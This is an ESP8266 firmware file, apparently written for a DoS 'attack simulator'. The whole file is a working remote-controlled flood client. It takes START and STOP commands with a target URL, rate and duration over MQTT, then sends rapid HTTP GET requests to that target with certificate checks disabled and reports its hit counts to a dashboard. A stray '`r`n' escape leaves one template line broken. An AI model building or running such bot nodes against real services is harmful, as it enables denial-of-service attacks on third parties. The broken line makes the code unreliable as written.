#include "config.h"
#include <ESP8266WiFi.h>
#include <PubSubClient.h>
#include <ESP8266HTTPClient.h>
#include <WiFiClientSecure.h>
#include <ArduinoJson.h>

WiFiClient espClient;
PubSubClient mqttClient(espClient);

bool running = false;
String targetURL = DEFAULT_TARGET;
int rate = DEFAULT_RATE;
unsigned long attackDuration = DEFAULT_DURATION;
unsigned long attackStartTime = 0;

unsigned long lastRequest = 0;
unsigned long lastHeartbeat = 0;
unsigned long attackCount = 0;

void connectWiFi() {
  Serial.print("Connecting to WiFi");
  WiFi.begin(WIFI_SSID, WIFI_PASSWORD);

  int attempts = 0;
  while (WiFi.status() != WL_CONNECTED && attempts < (WIFI_TIMEOUT / 500)) {
    delay(500);
    Serial.print(".");
    attempts++;
  }

  if (WiFi.status() == WL_CONNECTED) {
    Serial.println("\nWiFi connected");
    Serial.print("IP Address: ");
    Serial.println(WiFi.localIP());
  } else {
    Serial.println("\nWiFi connection failed");
    Serial.println("Please check SSID and password");
  }
}

template <size_t Capacity>`r`nvoid publishJson(const char* topic, StaticJsonDocument<Capacity>& doc) {
  String output;
  serializeJson(doc, output);
  mqttClient.publish(topic, output.c_str());
}

void sendAttackData() {
  StaticJsonDocument<256> doc;
  doc["deviceId"] = DEVICE_ID;
  doc["timestamp"] = millis();
  doc["count"] = attackCount;
  doc["type"] = "HTTP_GET";
  doc["target"] = targetURL;
  doc["status"] = "success";

  publishJson(MQTT_TOPIC_ATTACK, doc);
  Serial.print("Attack #");
  Serial.print(attackCount);
  Serial.println(" reported to dashboard");
}

void sendStatus() {
  StaticJsonDocument<256> doc;
  doc["deviceId"] = DEVICE_ID;
  doc["status"] = "online";
  doc["ip"] = WiFi.localIP().toString();
  doc["attackRate"] = running ? rate : 0;
  doc["target"] = targetURL;
  doc["attacksSent"] = attackCount;
  doc["running"] = running;

  publishJson(MQTT_TOPIC_STATUS, doc);
}

void sendHTTPAttack() {
  if (WiFi.status() != WL_CONNECTED) {
    Serial.println("WiFi disconnected");
    return;
  }

  WiFiClientSecure client;
  client.setInsecure();
  client.setTimeout(HTTP_TIMEOUT);

  HTTPClient http;
  http.begin(client, targetURL);
  http.addHeader("User-Agent", "ESP8266-Attacker/1.0");
  http.addHeader("X-Device-Id", DEVICE_ID);
  http.addHeader("X-Attack-Type", "DoS-Simulation");
  http.addHeader("Connection", "close");

  int httpCode = http.GET();

  if (httpCode > 0) {
    Serial.print("Attack sent. HTTP ");
    Serial.print(httpCode);
    Serial.print(" -> ");
    Serial.println(targetURL);

    attackCount++;
    sendAttackData();
  } else {
    Serial.print("Attack failed: ");
    Serial.println(http.errorToString(httpCode));
  }

  http.end();
  client.stop();
}

void callback(char* topic, byte* payload, unsigned int length) {
  String message = "";
  for (unsigned int i = 0; i < length; i++) {
    message += (char)payload[i];
  }

  Serial.println("\nMQTT command: " + message);

  StaticJsonDocument<512> doc;
  DeserializationError error = deserializeJson(doc, message);
  if (error) {
    Serial.println("JSON parse error");
    return;
  }

  String action = doc["action"] | "";

  if (action == "START") {
    running = true;
    attackStartTime = millis();

    if (doc.containsKey("target")) {
      targetURL = doc["target"].as<String>();
    }

    if (doc.containsKey("rate")) {
      rate = doc["rate"];
      if (rate > MAX_RATE) rate = MAX_RATE;
      if (rate < MIN_RATE) rate = MIN_RATE;
    }

    if (doc.containsKey("duration")) {
      attackDuration = doc["duration"];
      if (attackDuration > MAX_DURATION) attackDuration = MAX_DURATION;
    }

    Serial.println("================================");
    Serial.println("ATTACK STARTED");
    Serial.print("Target: ");
    Serial.println(targetURL);
    Serial.print("Rate: ");
    Serial.print(rate);
    Serial.println(" requests/second");
    if (attackDuration > 0) {
      Serial.print("Duration: ");
      Serial.print(attackDuration);
      Serial.println(" seconds");
    }
    Serial.println("================================");
    sendStatus();
  } else if (action == "STOP") {
    running = false;
    Serial.println("\nATTACK STOPPED");
    Serial.print("Total attacks sent: ");
    Serial.println(attackCount);
    sendStatus();
  }
}

void reconnectMQTT() {
  int attempts = 0;
  while (!mqttClient.connected() && attempts < 5) {
    Serial.print("Connecting to MQTT...");

    if (mqttClient.connect(DEVICE_ID)) {
      Serial.println(" connected");
      mqttClient.subscribe(MQTT_TOPIC_CONTROL);
      sendStatus();
      break;
    }

    Serial.print(" failed, rc=");
    Serial.print(mqttClient.state());
    Serial.println(" retrying...");
    delay(MQTT_RETRY_DELAY);
    attempts++;
  }
}

void sendHeartbeat() {
  StaticJsonDocument<256> doc;
  doc["deviceId"] = DEVICE_ID;
  doc["type"] = "heartbeat";
  doc["running"] = running;
  doc["attacksSent"] = attackCount;
  doc["uptime"] = millis() / 1000;
  doc["rssi"] = WiFi.RSSI();
  doc["target"] = targetURL;
  doc["attackRate"] = running ? rate : 0;

  publishJson(MQTT_TOPIC_HEARTBEAT, doc);
  Serial.print("Heartbeat sent - Attacks: ");
  Serial.println(attackCount);
}

void setup() {
  Serial.begin(115200);
  delay(100);

  Serial.println("\nESP8266 ATTACK SIMULATOR");
  Serial.print("Device ID: ");
  Serial.println(DEVICE_ID);
  Serial.print("Target URL: ");
  Serial.println(DEFAULT_TARGET);
  Serial.println();

  connectWiFi();

  mqttClient.setServer(MQTT_SERVER, MQTT_PORT);
  mqttClient.setCallback(callback);

  delay(1000);

  Serial.println("\nSystem ready");
  Serial.println("Waiting for commands via MQTT...");
  Serial.println("Send 'START' to begin attack");
  Serial.println("Send 'STOP' to stop attack\n");
}

void loop() {
  if (!mqttClient.connected()) {
    reconnectMQTT();
  }
  mqttClient.loop();

  if (millis() - lastHeartbeat > HEARTBEAT_INTERVAL) {
    sendHeartbeat();
    lastHeartbeat = millis();
  }

  if (running) {
    if (attackDuration > 0 && (millis() - attackStartTime) > (attackDuration * 1000)) {
      running = false;
      Serial.println("\nAttack duration completed");
      sendStatus();
    } else {
      unsigned long interval = 1000 / rate;
      if (millis() - lastRequest >= interval) {
        sendHTTPAttack();
        lastRequest = millis();
      }
    }
  }

  delay(1);
}

